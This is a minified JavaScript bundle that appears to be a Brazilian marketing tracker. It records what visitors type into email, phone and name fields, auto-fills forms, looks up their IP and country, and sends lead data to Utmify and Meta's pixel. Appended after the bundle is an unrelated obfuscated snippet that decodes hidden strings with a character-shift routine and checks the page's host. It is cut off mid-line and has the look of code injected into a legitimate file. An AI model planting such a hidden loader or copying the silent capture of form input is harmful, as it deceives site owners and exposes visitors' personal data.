(()=>{"use strict";var t={370:(t,e)=>{Object.defineProperty(e,"__esModule",{value:!0}),e.visibleForTesting=void 0,e.visibleForTesting=(t,e)=>{}},568:(t,e,n)=>{Object.defineProperty(e,"__esModule",{value:!0}),e.AppStorage=void 0;const i=n(923);e.AppStorage=class{static save(t,e){const n=JSON.stringify(e);localStorage.setItem(t,n)}static load(t){const e=localStorage.getItem(t);return e?JSON.parse(e):null}static getFbc(){const t=document.cookie.split(";");for(const e of t){const[t,n]=e.trim().split("=");if("_fbc"===t)return decodeURIComponent(n)}}static getFbp(){var t;return null!==(t=i.Utils.getCookieByNames("_fbp","fbp"))&&void 0!==t?t:void 0}}},717:function(t,e){var n=this&&this.__awaiter||function(t,e,n,i){return new(n||(n=Promise))((function(o,r){function a(t){try{l(i.next(t))}catch(t){r(t)}}function s(t){try{l(i.throw(t))}catch(t){r(t)}}function l(t){var e;t.done?o(t.value):(e=t.value,e instanceof n?e:new n((function(t){t(e)}))).then(a,s)}l((i=i.apply(t,e||[])).next())}))};Object.defineProperty(e,"__esModule",{value:!0}),e.CountryService=void 0,e.CountryService=class{static getCountry(t){var e,i;return n(this,void 0,void 0,(function*(){if(null===(e=t.geolocation)||void 0===e?void 0:e.country)return t.geolocation.country;const n=yield(yield fetch("https://ipapi.co/json/")).json();return null!==(i=n.country)&&void 0!==i?i:null}))}}},75:(t,e)=>{Object.defineProperty(e,"__esModule",{value:!0}),e.FBC=void 0;class n{constructor(t){this.version="fb",this.fbclid=t,this.subdomainIndex=0,this.creationTime=Date.now()}static fromClid(t){return t?new n(t):null}formatted(){return`${this.version}.${this.subdomainIndex}.${this.creationTime}.${this.fbclid}`}}e.FBC=n},865:function(t,e,n){var i=this&&this.__decorate||function(t,e,n,i){var o,r=arguments.length,a=r<3?e:null===i?i=Object.getOwnPropertyDescriptor(e,n):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(t,e,n,i);else for(var s=t.length-1;s>=0;s--)(o=t[s])&&(a=(r<3?o(a):r>3?o(e,n,a):o(e,n))||a);return r>3&&a&&Object.defineProperty(e,n,a),a},o=this&&this.__metadata||function(t,e){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(t,e)},r=this&&this.__awaiter||function(t,e,n,i){return new(n||(n=Promise))((function(o,r){function a(t){try{l(i.next(t))}catch(t){r(t)}}function s(t){try{l(i.throw(t))}catch(t){r(t)}}function l(t){var e;t.done?o(t.value):(e=t.value,e instanceof n?e:new n((function(t){t(e)}))).then(a,s)}l((i=i.apply(t,e||[])).next())}))};Object.defineProperty(e,"__esModule",{value:!0}),e.FormsListener=void 0;const a=n(370),s=n(119),l=n(568),c=n(717),d=n(562),u=n(554),p=n(526),v=n(923);class h{static init(){h.inited||(h.inited=!0,"complete"===document.readyState?h.startListening():window.addEventListener("load",h.startListening))}static startListening(){h.listenToForms(),new d.Observer({throttle:2e3,groupEvents:!0}).observeNewElements(document.body,(()=>{h.listenToForms()}))}static listenToForms(){Array.from(document.querySelectorAll("input, textarea")).forEach((t=>{h.canUseEl(t)&&(h.tryFill(t),t.addEventListener("input",h.handleInput),t.addEventListener("blur",h.handleInput))}))}static tryFill(t){var e,n,i,o;return r(this,void 0,void 0,(function*(){const r=yield p.Tracker.getTruthyLead(),a=h.classifyInput(t);a===s.InputType.Phone&&(t.value=null!==(e=r.phone)&&void 0!==e?e:""),a===s.InputType.Email&&(t.value=null!==(n=r.email)&&void 0!==n?n:""),a===s.InputType.Name&&(t.value=`${null!==(i=r.firstName)&&void 0!==i?i:""} ${null!==(o=r.lastName)&&void 0!==o?o:""}`)}))}static handleInput(t){return r(this,void 0,void 0,(function*(){const e=t.target,n=h.classifyInput(e),i=yield p.Tracker.getTruthyLead();if(n===s.InputType.Phone){const t=yield c.CountryService.getCountry(i),n=u.Phone.format(e.value,"BR"===t);l.AppStorage.save(p.Tracker.leadKey,Object.assign(Object.assign({},i),{phone:n}))}if(n===s.InputType.Email&&l.AppStorage.save(p.Tracker.leadKey,Object.assign(Object.assign({},i),{email:e.value})),n===s.InputType.Name){const t=e.value.split(" "),n=t[0],o=t.slice(1).join(" ");l.AppStorage.save(p.Tracker.leadKey,Object.assign(Object.assign({},i),{firstName:n,lastName:o}))}}))}static classifyInput(t){const{id:e,name:n,type:i,placeholder:o}=t;return"email"===i||(null==o?void 0:o.toLowerCase().includes("email"))||(null==e?void 0:e.toLowerCase().includes("field-email"))||(null==n?void 0:n.toLowerCase().includes("email"))?s.InputType.Email:(null==n?void 0:n.toLowerCase().includes("phone"))||(null==e?void 0:e.toLowerCase().includes("field-phone"))||(null==o?void 0:o.toLowerCase().includes("phone"))?s.InputType.Phone:(null==n?void 0:n.toLowerCase().includes("name"))||(null==e?void 0:e.toLowerCase().includes("field-name"))||(null==o?void 0:o.toLowerCase().includes("name"))?s.InputType.Name:s.InputType.Unknown}static canUseEl(t){if(h.usedIds.has(t.id))return!1;const e=v.Utils.getId(t);return h.usedIds.add(e),!0}}h.inited=!1,h.usedIds=new Set,i([a.visibleForTesting,o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",void 0)],h,"startListening",null),i([a.visibleForTesting,o("design:type",Function),o("design:paramtypes",[HTMLInputElement]),o("design:returntype",Promise)],h,"tryFill",null),i([a.visibleForTesting,o("design:type",Function),o("design:paramtypes",[Event]),o("design:returntype",Promise)],h,"handleInput",null),i([a.visibleForTesting,o("design:type",Function),o("design:paramtypes",[HTMLInputElement]),o("design:returntype",String)],h,"classifyInput",null),e.FormsListener=h},8:function(t,e){var n=this&&this.__awaiter||function(t,e,n,i){return new(n||(n=Promise))((function(o,r){function a(t){try{l(i.next(t))}catch(t){r(t)}}function s(t){try{l(i.throw(t))}catch(t){r(t)}}function l(t){var e;t.done?o(t.value):(e=t.value,e instanceof n?e:new n((function(t){t(e)}))).then(a,s)}l((i=i.apply(t,e||[])).next())}))};Object.defineProperty(e,"__esModule",{value:!0}),e.Ips=void 0,e.Ips=class{static getIpv4(){var t;return n(this,void 0,void 0,(function*(){try{const e=yield fetch("https://api.ipify.org?format=json").then((t=>t.json()));return null!==(t=e.ip)&&void 0!==t?t:void 0}catch(t){return void console.log("error on getIpv4",t)}}))}static getIpv6(){var t;return n(this,void 0,void 0,(function*(){try{const e=yield fetch("https://api6.ipify.org?format=json").then((t=>t.json()));return null!==(t=e.ip)&&void 0!==t?t:void 0}catch(t){return void console.log("error on getIpv6",t)}}))}}},774:function(t,e,n){var i=this&&this.__decorate||function(t,e,n,i){var o,r=arguments.length,a=r<3?e:null===i?i=Object.getOwnPropertyDescriptor(e,n):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(t,e,n,i);else for(var s=t.length-1;s>=0;s--)(o=t[s])&&(a=(r<3?o(a):r>3?o(e,n,a):o(e,n))||a);return r>3&&a&&Object.defineProperty(e,n,a),a},o=this&&this.__metadata||function(t,e){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(t,e)};Object.defineProperty(e,"__esModule",{value:!0}),e.checkoutButtonKeywors=e.checkoutLinkKeywords=e.NavigationListener=void 0;const r=n(370),a=n(562),s=n(526),l=n(923);class c{static init(){this.inited||(this.inited=!0,c.monitorLinks(),c.monitorWindowOpen(),c.monitorButtons(),c.monitorForms(),new a.Observer({throttle:2e3,groupEvents:!0}).observeNewElements(document.body,(()=>{c.monitorLinks(),c.monitorButtons(),c.monitorForms()})))}static monitorButtons(){Array.from(document.querySelectorAll("button")).forEach((t=>{this.canUseEl(t)&&t.addEventListener("click",(()=>{var e,n,i;c.isCheckoutButtonText(null!==(e=t.textContent)&&void 0!==e?e:"")&&(console.log("tracking ic with button",t),s.Tracker.track("InitiateCheckout")),c.isLeadButtonText(null!==(n=t.textContent)&&void 0!==n?n:"")&&(console.log("tracking lead with button",t),s.Tracker.track("Lead")),c.isAddToCartButtonText(null!==(i=t.textContent)&&void 0!==i?i:"")&&(console.log("tracking add to cart with button",t),s.Tracker.track("AddToCart"))}))}))}static monitorForms(){Array.from(document.querySelectorAll("form")).forEach((t=>{this.canUseEl(t)&&t.addEventListener("submit",(e=>{var n,i,o;const r=t.querySelector('button[type="submit"]');console.log("submitButton",r),c.isCheckoutButtonText(null!==(n=null==r?void 0:r.textContent)&&void 0!==n?n:"")&&(console.log("tracking ic with form",t),s.Tracker.track("InitiateCheckout")),c.isLeadButtonText(null!==(i=null==r?void 0:r.textContent)&&void 0!==i?i:"")&&(console.log("tracking lead with button",r),s.Tracker.track("Lead")),c.isAddToCartButtonText(null!==(o=null==r?void 0:r.textContent)&&void 0!==o?o:"")&&(console.log("tracking add to cart with button",r),s.Tracker.track("AddToCart"))}))}))}static monitorWindowOpen(){const t=window.open;window.open=function(e,n,i){return c.isCheckoutLink(null==e?void 0:e.toString(),void 0)&&s.Tracker.track("InitiateCheckout"),t(e,n||"",i||"")}}static monitorLinks(){const t=Array.from(document.querySelectorAll("a"));console.log("links to monitor",t),t.forEach((t=>{this.canUseEl(t)&&t.addEventListener("click",(()=>{var e,n,i;console.log("link clicked",t),c.isCheckoutLink(t.href,null!==(e=t.textContent)&&void 0!==e?e:"")&&s.Tracker.track("InitiateCheckout");const o=c.isLeadButtonText(null!==(n=t.textContent)&&void 0!==n?n:"");console.log("canSendLead",o),o&&(console.log("tracking lead with button",t),s.Tracker.track("Lead"));const r=c.isAddToCartButtonText(null!==(i=t.textContent)&&void 0!==i?i:"");console.log("canAddToCart",r),r&&(console.log("tracking add to cart with button",t),s.Tracker.track("AddToCart"))}))}))}static canUseEl(t){if(this.usedIds.has(t.id))return!1;const e=l.Utils.getId(t);return this.usedIds.add(e),!0}static isCheckoutLink(t,n){var i;console.log("check is checkout link: ",t);const o=s.Tracker.getTruthyLead();if(null!=o.icTextMatch)return null!==(i=null==n?void 0:n.includes(o.icTextMatch))&&void 0!==i&&i;for(const n of e.checkoutLinkKeywords)if(null==t?void 0:t.toLowerCase().includes(n.toLowerCase()))return!0;return!1}static isCheckoutButtonText(t){var n;console.log("check can iniate checkout: ",t);const i=s.Tracker.getTruthyLead();return null!=i.icTextMatch?null!==(n=null==t?void 0:t.includes(i.icTextMatch))&&void 0!==n&&n:e.checkoutButtonKeywors.some((e=>t.toLowerCase().includes(e)))}static isLeadButtonText(t){var e;console.log("check can send lead: ",t);const n=s.Tracker.getTruthyLead();return null!=n.leadTextMatch&&null!==(e=null==t?void 0:t.includes(n.leadTextMatch))&&void 0!==e&&e}static isAddToCartButtonText(t){var e;console.log("check can send add to cart: ",t);const n=s.Tracker.getTruthyLead();return null!=n.addToCartTextMatch&&null!==(e=null==t?void 0:t.includes(n.addToCartTextMatch))&&void 0!==e&&e}}c.inited=!1,c.usedIds=new Set,i([r.visibleForTesting,o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",void 0)],c,"monitorButtons",null),i([r.visibleForTesting,o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",void 0)],c,"monitorForms",null),i([r.visibleForTesting,o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",void 0)],c,"monitorWindowOpen",null),i([r.visibleForTesting,o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",void 0)],c,"monitorLinks",null),i([r.visibleForTesting,o("design:type",Function),o("design:paramtypes",[Object,Object]),o("design:returntype",Boolean)],c,"isCheckoutLink",null),i([r.visibleForTesting,o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Boolean)],c,"isCheckoutButtonText",null),i([r.visibleForTesting,o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Boolean)],c,"isLeadButtonText",null),i([r.visibleForTesting,o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Boolean)],c,"isAddToCartButtonText",null),e.NavigationListener=c,e.checkoutLinkKeywords=["checkout","pagamento","payment","pay","kiwify","hotmart","eduzz","monetizze","vindi","pague","comprar","finalizar","compra","cart","carrinho","order","pedido","confirmar","confirmacao","confirmation","adoorei","vega","buygoods","octuspay","perfect","iexperience","payt","guru","green","yampi","appmax","pepper"],e.checkoutButtonKeywors=["comprar","finalizar","compra","confirmar","quero ter","proximo passo","próximo passo","inscrição","inscricao","participar","participe","quero participar","checkout"]},562:(t,e)=>{Object.defineProperty(e,"__esModule",{value:!0}),e.Observer=void 0,e.Observer=class{constructor(t){var e,n;this.mutations=[],this.timer=null,this.setThrottle(null!==(e=t.throttle)&&void 0!==e?e:100),this.groupEvents=null!==(n=t.groupEvents)&&void 0!==n&&n}observeNewElements(t,e){this.callback=e,new MutationObserver(((t,e)=>{const n=this.groupEvents?1:null;(null==n||this.mutations.length<n)&&this.mutations.push({list:t,_observer:e})})).observe(t,{subtree:!0,childList:!0})}setThrottle(t){var e;this.throttle=t,null===(e=this.timer)||void 0===e||e.unref(),this.timer=setInterval((()=>{this.checkMutations()}),this.throttle)}checkMutations(){const t=this.mutations.length;for(let e=0;e<t;e++){const t=this.mutations.shift();t&&this.callback(t.list,t._observer)}}}},554:(t,e)=>{Object.defineProperty(e,"__esModule",{value:!0}),e.Phone=void 0,e.Phone=class{static format(t,e=!0){const n=t.replace(/\D/g,"");let i=n;const o=e?"55":"";return e&&(n.startsWith("00")?i=n.substring(2):n.startsWith("0")&&(i=n.substring(1)),10===i.length?i=`55${i.substring(0,2)}9${i.substring(2)}`:12===i.length&&i.startsWith("55")&&(i=`55${i.substring(0,4)}9${i.substring(4)}`)),i.startsWith(o)||(i=`${o}${i}`),i.replace(/^0+/,"")}}},428:function(t,e,n){var i=this&&this.__decorate||function(t,e,n,i){var o,r=arguments.length,a=r<3?e:null===i?i=Object.getOwnPropertyDescriptor(e,n):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(t,e,n,i);else for(var s=t.length-1;s>=0;s--)(o=t[s])&&(a=(r<3?o(a):r>3?o(e,n,a):o(e,n))||a);return r>3&&a&&Object.defineProperty(e,n,a),a},o=this&&this.__metadata||function(t,e){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(t,e)},r=this&&this.__awaiter||function(t,e,n,i){return new(n||(n=Promise))((function(o,r){function a(t){try{l(i.next(t))}catch(t){r(t)}}function s(t){try{l(i.throw(t))}catch(t){r(t)}}function l(t){var e;t.done?o(t.value):(e=t.value,e instanceof n?e:new n((function(t){t(e)}))).then(a,s)}l((i=i.apply(t,e||[])).next())}))};Object.defineProperty(e,"__esModule",{value:!0}),e.PixelUtmify=void 0;const a=n(370),s=n(937),l=n(792),c=n(923);class d{static init(t){return r(this,void 0,void 0,(function*(){var e,n,i,o,a,s;"undefined"==typeof fbq&&(e=window,n=document,i="script",e.fbq||(o=e.fbq=function(){o.callMethod?o.callMethod.apply(o,arguments):o.queue.push(arguments)},e._fbq||(e._fbq=o),o.push=o,o.loaded=!0,o.version="2.0",o.queue=[],(a=n.createElement(i)).async=!0,a.src="https://connect.facebook.net/en_US/fbevents.js",null==(s=n.getElementsByTagName(i)[0])||s.parentNode.insertBefore(a,s))),t&&t.length>0&&(yield Promise.all(t.map((t=>r(this,void 0,void 0,(function*(){d.initedPixels.includes(t)||(yield fbq("init",t),d.initedPixels.push(t))}))))))}))}static get baseUrl(){return"localhost"===window.location.hostname||"127.0.0.1"===window.location.hostname?"http://localhost:3001/tracking/v1":"https://tracking.utmify.com.br/tracking/v1"}static event(t){var e,n,i,o,a,l,c,d,u,p,v;return r(this,void 0,void 0,(function*(){const r=`${this.baseUrl}/events`,h=yield fetch(r,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)}).then((t=>t.json()));if(console.log(`response for ${null===(e=t.lead)||void 0===e?void 0:e.pixelId}: ${null===(n=null==h?void 0:h.lead)||void 0===n?void 0:n.metaPixelIds}`),null==h.lead._id)return null;const g=new s.Lead({_id:h.lead._id,pixelId:h.lead.pixelId,userAgent:h.lead.userAgent,birthdate:h.lead.birthdate,email:h.lead.email,fbc:h.lead.fbc,fbp:h.lead.fbp,firstName:h.lead.firstName,geolocation:h.lead.geolocation,ip:h.lead.ip,ipv6:h.lead.ipv6,lastName:h.lead.lastName,metaPixelIds:h.lead.metaPixelIds,phone:h.lead.phone,parameters:h.lead.parameters,updatedAt:new Date,icTextMatch:null!==(i=h.icTextMatch)&&void 0!==i?i:null,leadTextMatch:null!==(o=h.leadTextMatch)&&void 0!==o?o:null,addToCartTextMatch:null!==(a=h.addToCartTextMatch)&&void 0!==a?a:null});return"PageView"===t.type&&(yield this.init(g.metaPixelIds)),(null!==(c=null===(l=g.metaPixelIds)||void 0===l?void 0:l.length)&&void 0!==c?c:0)>0&&this.metaEvent(Object.assign(Object.assign({},t),{event:{_id:h.event._id,pageTitle:null!==(u=null===(d=t.event)||void 0===d?void 0:d.pageTitle)&&void 0!==u?u:null,sourceUrl:null!==(v=null===(p=t.event)||void 0===p?void 0:p.sourceUrl)&&void 0!==v?v:null}})),g}))}static updateLead(t){return r(this,void 0,void 0,(function*(){const e=`${this.baseUrl}/lead`;return!0===(yield fetch(e,{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)}).then((t=>t.json())))}))}static metaEvent(t){var e,n,i,o,a,s,d,u,p,v,h,g,f,y,m,b,T,w,k,_,x,C,L,F;return r(this,void 0,void 0,(function*(){const r=l.StringUtils.removeAllNonAlphaChars(null!==(i=null===(n=null===(e=t.lead)||void 0===e?void 0:e.geolocation)||void 0===n?void 0:n.city)&&void 0!==i?i:void 0),I=l.StringUtils.removeAllNonAlphaChars(null!==(s=null===(a=null===(o=t.lead)||void 0===o?void 0:o.geolocation)||void 0===a?void 0:a.state)&&void 0!==s?s:void 0),P=l.StringUtils.removeAllNonAlhaNumericChars(null!==(p=null===(u=null===(d=t.lead)||void 0===d?void 0:d.geolocation)||void 0===u?void 0:u.zipcode)&&void 0!==p?p:void 0),j=l.StringUtils.removeAllNonAlphaAccentChars(null===(v=t.lead)||void 0===v?void 0:v.firstName),S=l.StringUtils.removeAllNonAlphaAccentChars(null===(h=t.lead)||void 0===h?void 0:h.lastName);fbq("track",t.type,{event_time:c.Utils.getEventTime(),event_day:c.Utils.getEventDay(),event_day_in_month:c.Utils.getEventDayInMonth(),event_month:c.Utils.getEventMonth(),event_time_interval:c.Utils.getEventTimeInterval(),event_url:window.location.href,event_source_url:window.location.href,traffic_source:document.referrer,ct:yield c.Utils.hashValue(r),st:yield c.Utils.hashValue(I),zp:yield c.Utils.hashValue(P),client_user_agent:null===(g=t.lead)||void 0===g?void 0:g.userAgent,client_ip_address:null!==(y=null===(f=t.lead)||void 0===f?void 0:f.ipv6)&&void 0!==y?y:null===(m=t.lead)||void 0===m?void 0:m.ip,country:yield c.Utils.hashValue(null!==(w=null===(T=null===(b=t.lead)||void 0===b?void 0:b.geolocation)||void 0===T?void 0:T.country)&&void 0!==w?w:void 0),external_id:null===(k=t.lead)||void 0===k?void 0:k._id,fn:yield c.Utils.hashValue(j),ln:yield c.Utils.hashValue(S),em:yield c.Utils.hashValue(null===(_=null==t?void 0:t.lead)||void 0===_?void 0:_.email),ph:yield c.Utils.hashValue(null===(x=null==t?void 0:t.lead)||void 0===x?void 0:x.phone),fbc:null===(C=t.lead)||void 0===C?void 0:C.fbc,fbp:null===(L=t.lead)||void 0===L?void 0:L.fbp,content_type:"product",page_title:document.title},{eventID:null===(F=t.event)||void 0===F?void 0:F._id})}))}}d.initedPixels=[],i([a.visibleForTesting,o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],d,"metaEvent",null),e.PixelUtmify=d},792:(t,e)=>{Object.defineProperty(e,"__esModule",{value:!0}),e.StringUtils=void 0,e.StringUtils=class{static removeAllNonAlphaAccentChars(t){return null!=t?t.replace(/[0-9]/g,"").replace(/[^a-zA-ZÀ-ÿ\s]/g,"").replace(/[^a-zA-ZÀ-ÿ]/g,"").toLowerCase():void 0}static removeAllNonAlphaChars(t){return null!=t?t.replace(/[^a-zA-Z]/g,"").toLowerCase():void 0}static removeAllNonAlhaNumericChars(t){return null!=t?t.replace(/[^a-zA-Z0-9]/g,"").toLowerCase():void 0}}},526:function(t,e,n){var i=this&&this.__decorate||function(t,e,n,i){var o,r=arguments.length,a=r<3?e:null===i?i=Object.getOwnPropertyDescriptor(e,n):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(t,e,n,i);else for(var s=t.length-1;s>=0;s--)(o=t[s])&&(a=(r<3?o(a):r>3?o(e,n,a):o(e,n))||a);return r>3&&a&&Object.defineProperty(e,n,a),a},o=this&&this.__metadata||function(t,e){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(t,e)},r=this&&this.__awaiter||function(t,e,n,i){return new(n||(n=Promise))((function(o,r){function a(t){try{l(i.next(t))}catch(t){r(t)}}function s(t){try{l(i.throw(t))}catch(t){r(t)}}function l(t){var e;t.done?o(t.value):(e=t.value,e instanceof n?e:new n((function(t){t(e)}))).then(a,s)}l((i=i.apply(t,e||[])).next())}))};Object.defineProperty(e,"__esModule",{value:!0}),e.Tracker=void 0;const a=n(370),s=n(937),l=n(568),c=n(75),d=n(865),u=n(8),p=n(774),v=n(428),h=n(436);class g{static get leadKey(){return"Meta"===this.type?"lead":"lead-google"}static get pixelId(){return"Meta"===this.type?window.pixelId:window.googlePixelId}static init(t){return r(this,void 0,void 0,(function*(){if(console.log("Tracker.inited?:",this.inited),this.inited)return;this.inited=!0,this.type=t;const[e,n]=yield Promise.all([u.Ips.getIpv4(),u.Ips.getIpv6()]);g.ipv4=e,g.ipv6=n,d.FormsListener.init(),p.NavigationListener.init(),g.track("PageView"),h.ViewContentListener.init(),yield g.trySendFbp()}))}static trySendFbp(){return r(this,void 0,void 0,(function*(){const t=()=>r(this,void 0,void 0,(function*(){const t=g.getTruthyLead();(null==t?void 0:t._id)&&t.fbp&&(yield v.PixelUtmify.updateLead({_id:t._id,fbp:t.fbp}))&&l.AppStorage.save(g.leadKey,t)}));setTimeout(t,2500),setTimeout(t,5e3)}))}static track(t){return r(this,void 0,void 0,(function*(){if(this.trackedEvents.includes(t))return;this.trackedEvents.push(t);const e=this.getTruthyLead(),n=yield v.PixelUtmify.event({type:t,lead:e,event:this.getEventData()});l.AppStorage.save(this.leadKey,n)}))}static getTruthyLead(){const t=g.getLeadFromLocalStorageOrNew();return g.getLeadWithBasicFields(t)}static getLeadFromLocalStorageOrNew(){return l.AppStorage.load(this.leadKey)||new s.Lead({pixelId:this.pixelId,userAgent:navigator.userAgent,icTextMatch:null,leadTextMatch:null,addToCartTextMatch:null})}static getLeadWithBasicFields(t){const e=g.getFbc(t),n=g.getFbp(t),i=g.getGclid(t);return Object.assign(Object.assign({},t),{fbc:e,fbp:n,gclid:i,parameters:window.location.search,ip:g.ipv4,ipv6:g.ipv6})}static getFbc(t){var e;if(t.fbc)return t.fbc;const n=null!==(e=new URLSearchParams(window.location.search).get("fbclid"))&&void 0!==e?e:void 0,i=n?c.FBC.fromClid(n):void 0,o=null==i?void 0:i.formatted();return o||(l.AppStorage.getFbc()||o)}static getFbp(t){return t.fbp?t.fbp:l.AppStorage.getFbp()}static getGclid(t){var e;return t.gclid?t.gclid:null!==(e=new URLSearchParams(window.location.search).get("gclid"))&&void 0!==e?e:void 0}static getEventData(){return{sourceUrl:document.referrer||null,pageTitle:document.title||null}}}g.inited=!1,g.type="Meta",g.trackedEvents=[],i([a.visibleForTesting,o("design:type",String),o("design:paramtypes",[])],g,"pixelId",null),i([a.visibleForTesting,o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",s.Lead)],g,"getLeadFromLocalStorageOrNew",null),i([a.visibleForTesting,o("design:type",Function),o("design:paramtypes",[s.Lead]),o("design:returntype",s.Lead)],g,"getLeadWithBasicFields",null),i([a.visibleForTesting,o("design:type",Function),o("design:paramtypes",[s.Lead]),o("design:returntype",Object)],g,"getFbc",null),i([a.visibleForTesting,o("design:type",Function),o("design:paramtypes",[s.Lead]),o("design:returntype",Object)],g,"getFbp",null),i([a.visibleForTesting,o("design:type",Function),o("design:paramtypes",[s.Lead]),o("design:returntype",Object)],g,"getGclid",null),i([a.visibleForTesting,o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Object)],g,"getEventData",null),e.Tracker=g},923:function(t,e){var n=this&&this.__awaiter||function(t,e,n,i){return new(n||(n=Promise))((function(o,r){function a(t){try{l(i.next(t))}catch(t){r(t)}}function s(t){try{l(i.throw(t))}catch(t){r(t)}}function l(t){var e;t.done?o(t.value):(e=t.value,e instanceof n?e:new n((function(t){t(e)}))).then(a,s)}l((i=i.apply(t,e||[])).next())}))};Object.defineProperty(e,"__esModule",{value:!0}),e.Utils=void 0;class i{static hashValue(t){return n(this,void 0,void 0,(function*(){if(t&&t.length){if(crypto&&crypto.subtle){const e=(new TextEncoder).encode(t),n=yield crypto.subtle.digest("SHA-256",e);return Array.from(new Uint8Array(n)).map((t=>t.toString(16).padStart(2,"0"))).join("")}return sha256||(yield i.loadScript("https://cdn.jsdelivr.net/npm/js-sha256/src/sha256.min.js")),sha256(t)}}))}static loadScript(t){return n(this,void 0,void 0,(function*(){return new Promise(((e,n)=>{const i=document.createElement("script");i.src=t,i.onload=e,i.onerror=n,document.head.appendChild(i)}))}))}static wait(t){return new Promise((e=>{setTimeout(e,t)}))}static getEventTime(){const t=new Date,e=Date.UTC(t.getUTCFullYear(),t.getUTCMonth(),t.getUTCDate(),t.getUTCHours(),t.getUTCMinutes(),t.getUTCSeconds(),t.getUTCMilliseconds());return Math.floor(e/1e3)}static getEventDayInMonth(){return(new Date).getDate()}static getEventDay(){return["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"][(new Date).getDay()]}static getEventMonth(){return["January","February","March","April","May","June","July","August","September","October","November","December"][(new Date).getMonth()]}static getEventTimeInterval(){const t=(new Date).getHours();return`${t}-${t+1}`}static getCookieByNames(...t){for(const e of t){const t=e,n=i.getCookieFromStorage(t);if(n)return n}for(const e of t){const t=e,n=i.getCookieFromUrl(t);if(n)return n}return null}static getCookieFromStorage(t){const e=document.cookie.split(";");for(const n of e){const[e,i]=n.trim().split("=");if(e===t)return i}return null}static getCookieFromUrl(...t){const e=new URLSearchParams(window.location.search);for(const n of t)if(e.has(n))return e.get(n);return null}static getId(t){if(t.id)return t.id;const e=i.uuid();return t.id=e,e}static uuid(){const t=()=>Math.floor(65536*(1+Math.random())).toString(16).substring(1);return`${t()+t()}-${t()}-${t()}-${t()}-${t()+t()+t()}`}}e.Utils=i},436:function(t,e,n){var i=this&&this.__decorate||function(t,e,n,i){var o,r=arguments.length,a=r<3?e:null===i?i=Object.getOwnPropertyDescriptor(e,n):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(t,e,n,i);else for(var s=t.length-1;s>=0;s--)(o=t[s])&&(a=(r<3?o(a):r>3?o(e,n,a):o(e,n))||a);return r>3&&a&&Object.defineProperty(e,n,a),a},o=this&&this.__metadata||function(t,e){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(t,e)},r=this&&this.__awaiter||function(t,e,n,i){return new(n||(n=Promise))((function(o,r){function a(t){try{l(i.next(t))}catch(t){r(t)}}function s(t){try{l(i.throw(t))}catch(t){r(t)}}function l(t){var e;t.done?o(t.value):(e=t.value,e instanceof n?e:new n((function(t){t(e)}))).then(a,s)}l((i=i.apply(t,e||[])).next())}))};Object.defineProperty(e,"__esModule",{value:!0}),e.ViewContentListener=void 0;const a=n(370),s=n(526),l=n(923);class c{static init(){c.trackByTime(),c.trackByScroll()}static trackByTime(){return r(this,void 0,void 0,(function*(){yield l.Utils.wait(8e3),s.Tracker.track("ViewContent")}))}static trackByScroll(){return r(this,void 0,void 0,(function*(){window.addEventListener("scroll",(()=>r(this,void 0,void 0,(function*(){console.log("scrolling",window.scrollY),window.scrollY>100&&s.Tracker.track("ViewContent")}))))}))}}i([a.visibleForTesting,o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],c,"trackByTime",null),i([a.visibleForTesting,o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],c,"trackByScroll",null),e.ViewContentListener=c},119:(t,e)=>{var n;Object.defineProperty(e,"__esModule",{value:!0}),e.InputType=void 0,(n=e.InputType||(e.InputType={})).Name="Name",n.Email="Email",n.Phone="Phone",n.Unknown="Unknown"},937:(t,e)=>{Object.defineProperty(e,"__esModule",{value:!0}),e.Lead=void 0,e.Lead=class{constructor(t){this.pixelId=t.pixelId,this._id=t._id,this.email=t.email,this.firstName=t.firstName,this.lastName=t.lastName,this.phone=t.phone,this.birthdate=t.birthdate,this.metaPixelIds=t.metaPixelIds,this.geolocation=t.geolocation,this.userAgent=t.userAgent,this.ip=t.ip,this.ipv6=t.ipv6,this.fbc=t.fbc,this.fbp=t.fbp,this.gclid=t.gclid,this.parameters=t.parameters,this.updatedAt=t.updatedAt,this.icTextMatch=t.icTextMatch,this.leadTextMatch=t.leadTextMatch,this.addToCartTextMatch=t.addToCartTextMatch}}}},e={};function n(i){var o=e[i];if(void 0!==o)return o.exports;var r=e[i]={exports:{}};return t[i].call(r.exports,r,r.exports,n),r.exports}(()=>{const t=n(526);console.log("Tracker Meta version 1.5.1"),t.Tracker.init("Meta")})()})();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new 